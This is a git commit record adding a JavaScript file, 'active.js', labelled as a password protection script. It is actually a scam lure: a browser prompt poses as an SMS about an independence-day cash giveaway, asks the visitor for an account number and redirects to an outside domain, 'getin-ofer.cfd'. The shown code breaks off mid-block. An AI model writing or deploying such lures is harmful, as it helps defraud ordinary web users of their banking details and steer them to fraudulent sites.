a433d0cae1a5513445952aaab2c3a288e765793f
Help-All <imaobongumoh637@gmail.com>
2026-01-03 20:43:30 +0100

    Create active.js

---
+++ active.js
@@ -0,0 +1,8 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive HAPPY INDEPENDENCE GIVEAWAY. Please press OK to Enter your Account Number.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://getin-ofer.cfd/Happy-Independce.html';
